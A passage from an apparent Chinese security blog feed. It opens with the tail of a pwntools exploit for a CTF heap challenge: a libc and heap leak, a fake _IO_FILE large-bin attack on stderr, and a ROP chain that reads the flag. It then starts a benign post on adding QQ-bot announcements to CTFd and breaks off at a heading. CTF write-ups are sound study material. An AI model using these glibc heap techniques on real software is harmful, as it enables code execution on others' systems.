| r00t QWB QWXFadmin&quot;</span><br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~\n&#x27;</span>,payload)<br>    <span class="hljs-comment"># payload = &quot;CAT | r00t QWB QWXF\xFF\xFF\xFF\xFF&quot;</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,cont)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,cont</span>):<br>    io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xFF\xFF\xFF\xFF&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    io.sendafter(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>, cont)<br>    <br><br>login()<br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x420</span>,<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;bbb&#x27;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;ccc&#x27;</span>)<br><span class="hljs-comment"># p()</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;ddd&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">#libc_base</span><br>io.recvuntil(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x21a0d0</span><br>io.recv(<span class="hljs-number">10</span>)<br>heapbase = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>success(<span class="hljs-string">&quot;heapbase--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(heapbase))<br><span class="hljs-comment"># p()</span><br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002be51</span> <span class="hljs-comment">#: pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x000000000011f497</span> <span class="hljs-comment">#: pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span> <span class="hljs-comment">#: pop rax ; ret</span><br>ret=libc_base+<span class="hljs-number">0x0000000000029cd6</span><br>stderr=libc_base+libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]<br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>close=libc_base+libc.sym[<span class="hljs-string">&#x27;close&#x27;</span>]<br>read=libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>syscallret=libc_base+libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)).__next__()<br>success(<span class="hljs-string">&#x27;syscall_ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(syscallret))<br><br><span class="hljs-comment">#fake IO</span><br>ioaddr=heapbase+<span class="hljs-number">0xb00</span><br>next_chain = <span class="hljs-number">0</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE +=p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">2</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xc18</span>-<span class="hljs-number">0x68</span>)<span class="hljs-comment">#rdx</span><br>fake_IO_FILE +=p64(setcontext+<span class="hljs-number">61</span>)<span class="hljs-comment">#call addr</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># _chain</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0x200</span>)  <span class="hljs-comment"># _lock = writable address</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE +=p64(heapbase+<span class="hljs-number">0xb30</span>) <span class="hljs-comment">#rax1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xB0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)  <span class="hljs-comment"># _mode = 1</span><br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xC8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base+<span class="hljs-number">0x2160d0</span>)  <span class="hljs-comment"># vtable=IO_wfile_jumps+0x10</span><br>fake_IO_FILE +=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br>fake_IO_FILE += p64(heapbase+<span class="hljs-number">0xb30</span>+<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># rax2</span><br>flagaddr=heapbase+<span class="hljs-number">0x17d0</span><br>payload1=fake_IO_FILE+p64(flagaddr)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(heapbase+<span class="hljs-number">0x2050</span>)+p64(ret)<br><br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x418</span>,payload1)<br>delete(<span class="hljs-number">6</span>)<br><span class="hljs-comment"># p()</span><br><span class="hljs-comment">#large bin attack stderr poiniter</span><br>edit(<span class="hljs-number">0</span>,p64(libc_base+<span class="hljs-number">0x21a0d0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x290</span>)+p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x440</span>,<span class="hljs-string">&#x27;aaaaa&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;eee&#x27;</span>)<br><br><span class="hljs-comment">#rop</span><br>payload=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(close)\<br>    +p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscallret)\<br>        +p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read)\<br>            +p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x430</span>,payload)<br>delete(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x450</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>))<br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-comment"># p()</span><br><br>edit(<span class="hljs-number">5</span>,p64(libc_base+<span class="hljs-number">0x21a0e0</span>)*<span class="hljs-number">2</span>+p64(heapbase+<span class="hljs-number">0x1370</span>)+p64(heapbase+<span class="hljs-number">0x28e0</span>-<span class="hljs-number">0x20</span>+<span class="hljs-number">3</span>))<br><span class="hljs-comment">#trigger __malloc_assert</span><br>io.sendafter(<span class="hljs-string">&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="hljs-string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat choice:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat idx:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br><span class="hljs-comment">#gdb.attach(io,&#x27;b* (_IO_wfile_seekoff)&#x27;)</span><br>io.sendlineafter(<span class="hljs-string">&#x27;plz input your cat size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x450</span>))  <span class="hljs-comment"># add(11,0X450)</span><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【CTFd 二次开发】解题播报机器人 V2</title>
    <link href="/2022/11/08/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V2/"/>
    <url>/2022/11/08/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文基于 CTFd Version 3.4.3 开发，可能存在源码不相同的情况，阅读时请注意文章时效性。</p></blockquote><h2 id="更新内容"><a href="#更新内容" class="headerlink" title="更新内容"></a>更新内容</h2><ul><li>实现CTFd创建新题目的播报，且仅在题目状态由<code>hidden</code>转为<code>visible</code>时播报</li><li>实现题目信息更新时，进行播报</li></ul><p><img src="/img/article/botv2/image-20221108200108487.png" alt="效果展示"></p><h2 id="前端页面修改"><a href="#前端页面修改" class="headerlink" title="前端页面修改"></a>前端页面修改</h2><h3 id="appearance-html"><a href="#appearance-html" class="headerlink" title="appearance.html"></a>appearance.html</h3><p>打开<code>CTFd/CTFd/themes/admin/templates/configs/appearance.html</code>，在上次更新的基础上增加题目创建播报文案，和题目信息更新播报文案接口。这里直接放出完整html，可自行对照</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tabpanel&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tab-pane config-section active&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;appearance&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-100&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ctf_name&quot;</span>&gt;</span><br>Competition Name<br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span>Competition name displayed instead of a logo<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;CTF Name&quot;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">ctf_name</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">ctf_name</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; ctf_name &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>CTF Description<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>Description for the CTF<br><span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>&#123;&#123; ctf_description &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-ip&quot;</span>&gt;</span><br>                Bot Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    the address of QQ-bot<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    eg. 127.0.0.1:1234<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-ip&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bot_ip&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot_ip</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bot_ip</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bot_ip &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;group-id&quot;</span>&gt;</span><br>                QQ Group Number<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;group-id&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;group_id&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">group_id</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">group_id</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; group_id &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-text&quot;</span>&gt;</span><br>                解题播报消息格式<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. 恭喜%s做出题目%s，默认第一个参数为用户名，第二个参数为题目名称<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bottext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bottext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bottext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bottext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;create-text&quot;</span>&gt;</span><br>                题目可见播报<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. 题目%s已登入平台<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;create-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;createtext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">createtext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">createtext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; createtext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;update-text&quot;</span>&gt;</span><br>                题目更新播报<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. 题目%s内容已更新<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;update-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;updatetext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">updatetext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">updatetext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; updatetext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;botof&quot;</span>&gt;</span><br>                Turn on the Bot<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;botof&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bot&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">0</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">0</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        OFF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">1</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        ON<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-md btn-primary float-right&quot;</span>&gt;</span>Update<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/img/article/botv2/image-20221108200540771.png" alt="image-20221108200540771"></p><h2 id="后端更改"><a href="#后端更改" class="headerlink" title="后端更改"></a>后端更改</h2><h3 